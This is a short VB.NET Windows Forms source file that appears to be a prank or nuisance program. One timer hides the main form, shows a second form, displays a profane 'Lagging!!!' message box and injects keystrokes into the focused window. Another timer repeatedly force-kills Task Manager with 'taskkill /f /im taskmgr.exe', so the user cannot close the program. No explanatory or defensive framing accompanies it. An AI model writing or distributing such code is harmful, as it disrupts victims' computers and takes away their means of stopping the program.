Public Class Form1

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        Me.Hide()
        Form2.Show()
        MsgBox("Lagging!!! ", MsgBoxStyle.Information, "fuck")
        SendKeys.Send("{enter}")
        SendKeys.Send("123zxcvbny")

    End Sub

 

    Private Sub Timer2_Tick_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer2.Tick
        Form2.Show()
        Shell("taskkill /f /im taskmgr.exe")
    End Sub
End Class
